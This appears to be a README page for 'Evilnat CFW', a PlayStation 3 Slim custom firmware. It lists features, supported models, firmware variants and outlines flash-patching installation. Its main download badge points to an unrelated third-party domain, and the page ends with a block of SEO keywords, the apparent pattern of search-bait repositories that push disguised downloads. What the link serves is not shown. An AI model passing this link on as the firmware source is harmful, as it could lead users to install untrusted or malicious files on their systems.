<h1 align="center">🎮 Evilnat CFW</h1>

<p align="center">
  <strong>Custom Firmware. Cobra Integration. System Control.</strong>
</p>

<p align="center">
  Custom firmware for compatible Sony PlayStation 3 Slim consoles.
  <br>
  Cobra 8.5 · Homebrew Execution · Package Manager · System Configuration · Firmware Tools
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file">
    <img src="https://img.shields.io/badge/EVILNAT%20CFW%20DOWNLOAD-5B5BFF?style=for-the-badge&logo=playstation&logoColor=white" alt="Evilnat CFW Download">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-4.93-5B5BFF?style=flat-square">
  <img src="https://img.shields.io/badge/cobra-8.5-5B5BFF?style=flat-square">
  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
  <img src="https://img.shields.io/badge/platform-PS3%20Slim-252525?style=flat-square">
</p>

<details>
  <summary>📑 Contents</summary>

  - [Quick Start](#-quick-start)
  - [Requirements](#-requirements)
  - [Key Features](#-key-features)
  - [Module Overview](#-module-overview)
  - [Supported Platforms](#-supported-platforms)
  - [Compatibility Information](#-compatibility-information)
  - [Technical Specifications](#-technical-specifications)
  - [Installation Guide](#-installation-guide)
  - [FAQ](#-faq)
  - [SEO Keywords](#-seo-keywords)
</details>

## ⚡ Quick Start

1. Identify the exact PS3 Slim model number and minimum downgrade version.
2. Confirm that the console supports traditional custom firmware installation.
3. Select the appropriate Evilnat 4.93 firmware variant and follow the documented installation procedure.

Once installed, Evilnat provides Cobra functionality, homebrew execution, package management, and additional system configuration options.

## 🖥️ Requirements

| Requirement | Specification |
|---|---|
| Hardware | CFW-compatible PlayStation 3 Slim |
| Firmware | Compatible OFW, HFW, or existing CFW configuration |
| Firmware Release | Evilnat 4.93 Cobra 8.5 |
| Storage | FAT32 USB storage for documented firmware installation |
| Firmware Package | Model- and target-specific PS3UPDAT.PUP |
| Compatibility Check | Console model and minimum version verification |

## ✨ Key Features

### Custom Firmware Environment

- 🎮 **Homebrew Execution** — Supports running unsigned applications and compatible homebrew software.
- 📦 **Package Manager** — Integrates package installation functionality into the PS3 environment.
- 🧩 **Cobra 8.5** — Includes Cobra functionality enabled by default.
- 🔧 **System Patches** — Applies firmware-level changes for additional system functionality.

### System Management

- 🌡️ **Fan Control** — Provides fan control functionality and temperature-related system features.
- 🖥️ **XMB Integration** — Adds custom firmware options and configuration functionality.
- 🔄 **Firmware Management** — Includes custom firmware update functionality.
- 💾 **Storage Compatibility** — Supports compatible ISO and folder-based content formats.

### Advanced Features

- ⚙️ **LV1 and LV2 Functions** — Includes documented kernel-level peek and poke functionality.
- 🎯 **RSX Controls** — Provides optional RSX overclocking variants.
- 🕹️ **Multi-System Compatibility** — Supports compatible PS1, PS2, PSP, and PS3 content formats, subject to hardware and emulator limitations.

## 📋 Module Overview

| Component | Responsibility |
|---|---|
| Cobra 8.5 | Cobra custom firmware payload and functionality |
| xai_plugin | Custom firmware configuration and XMB options |
| VSH Components | XMB and system interface integration |
| Kernel Patches | Firmware-level system modifications |
| Fan Control | Fan speed and temperature management functionality |
| Package Manager | Installation of compatible PKG files |
| Flash Writer | Flash patching workflow used for eligible OFW-to-CFW installations |

## 🚀 Supported Platforms

| PS3 Slim Model Family | Compatibility |
|---|---|
| CECH-20xx | CFW-compatible |
| CECH-21xx | CFW-compatible |
| CECH-25xx | Conditional; minimum downgrade version must be 3.56 or lower |
| CECH-30xx | Not supported through the standard software CFW installation method |
| PS3 Super Slim CECH-40xx | Not supported through the standard software CFW installation method |

The model number alone is not sufficient for every CECH-25xx console. Verify the minimum downgrade version before selecting a firmware installation method.

## 🔍 Compatibility Information

Evilnat 4.93 Cobra 8.5 is based on PlayStation 3 firmware 4.93.

The firmware release provides multiple target variants:

| Variant | Description |
|---|---|
| CEX | Retail console firmware |
| PEX | CEX firmware with ported DEX modules |
| D-PEX | DEX-oriented firmware with ported modules |
| DEX | Debug-target firmware variant |

Additional hardware-specific builds include:

- **noBD** — For systems with a missing or defective Blu-ray drive logic board.
- **noBT** — For systems with a missing or defective Bluetooth component.
- **noBD + noBT** — Combines both hardware-specific modifications.
- **Overclocked** — Optional GPU and memory clock variants.

Choose a build based on the console's target ID and hardware condition. Do not substitute one variant for another based solely on its version number.

## 🛠️ Technical Specifications

| Specification | Details |
|---|---|
| Project | Evilnat CFW |
| Firmware Version | 4.93 |
| Cobra Version | 8.5 |
| Platform | PlayStation 3 |
| Target Hardware | Compatible PS3 Slim models |
| Firmware Base | Official Firmware 4.93 CEX |
| Firmware Variants | CEX, PEX, D-PEX, DEX |
| Package Format | PUP |
| System Integration | Cobra, XMB, kernel patches |
| Additional Components | xai_plugin |
| Installation Utility | PS3Xploit Flash Writer 4.93, where applicable |

## 📥 Installation Guide

### 1. Verify Hardware Compatibility

1. Locate the CECH model number on the console.
2. Check the minimum downgrade version using an appropriate model-verification method.
3. Confirm that the console is eligible for traditional CFW.
4. Identify the correct NAND or NOR flash type for the hardware.

### 2. Prepare the Installation Environment

For an eligible console currently on OFW, follow the documented HFW and Flash Writer 4.93 procedure.

Before writing to the console flash, create a flash dump and validate it with the recommended verification tools.

### 3. Select the Correct Firmware

Choose the correct Evilnat 4.93 variant:

- CEX or PEX for compatible retail configurations.
- D-PEX or DEX only for the appropriate debug target configuration.
- noBD or noBT variants only when the corresponding hardware condition applies.

### 4. Install Evilnat CFW

For an eligible OFW-to-CFW installation, complete the required flash-patching procedure first.

Place the selected firmware package on a FAT32 USB drive using the expected directory structure:

`PS3/UPDATE/PS3UPDAT.PUP`

Follow the release-specific installation instructions and do not interrupt the firmware installation process.

### 5. Verify Installation

After the console restarts, check System Information for the installed firmware version.

Confirm that the expected custom firmware options and Cobra functionality are available.

## ❓ FAQ

### Which PS3 Slim models support Evilnat CFW?

CECH-20xx and CECH-21xx models support traditional CFW. CECH-25xx models require a minimum downgrade version of 3.56 or lower.

### Does Evilnat CFW include Cobra?

Yes. Evilnat 4.93 includes Cobra 8.5, enabled by default.

### What is the difference between CEX and PEX?

CEX is the retail firmware variant. PEX combines a CEX base with ported DEX modules. D-PEX is intended for the corresponding DEX configuration.

### Can Evilnat run homebrew applications?

Yes. The firmware includes patches that allow compatible unsigned applications and homebrew software to run.

### Can I install Evilnat on a PS3 Super Slim?

Not through the standard software-based CFW installation method. PS3 Super Slim systems use other homebrew approaches, such as PS3HEN.

## 🔎 SEO Keywords

Evilnat CFW, Evilnat 4.93, PS3 Slim custom firmware, PS3 CFW, PlayStation 3 firmware, Cobra 8.5, Evilnat Cobra 8.5, PS3 CEX firmware, PS3 PEX firmware, PS3 D-PEX firmware, PS3 homebrew, PS3 package manager, PS3Xploit Flash Writer, PS3 Slim jailbreak compatibility, CECH-20xx CFW, CECH-21xx CFW, CECH-25xx minimum version, PS3 fan control, PS3 firmware installation, PS3 custom firmware guide

<p align="center">
  <strong>🎮 Evilnat CFW</strong>
  <br>
  Cobra 8.5 · Homebrew Execution · Package Management · System Configuration
  <br>
  PlayStation 3 Custom Firmware
</p>
